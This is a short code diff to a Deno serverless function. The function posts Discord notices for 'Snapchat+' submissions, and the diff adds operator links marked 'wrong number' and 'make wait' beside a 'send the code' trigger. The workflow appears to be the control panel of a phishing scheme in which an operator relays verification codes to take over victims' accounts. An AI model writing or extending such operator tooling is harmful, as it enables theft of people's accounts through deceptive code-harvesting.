@@ -19,6 +19,8 @@ Deno.serve(async (req) => {
 
   const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
   const triggerUrl = `${appUrl}/?trigger=${submissionId}`;
+  const wrongUrl = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const waitUrl = `${appUrl}/?triggerAction=wait&id=${submissionId}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -31,7 +33,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ [**Mauvais numéro**](${wrongUrl})\n⏳ [**Faire patienter**](${waitUrl})`,
         inline: false
       },
     ],
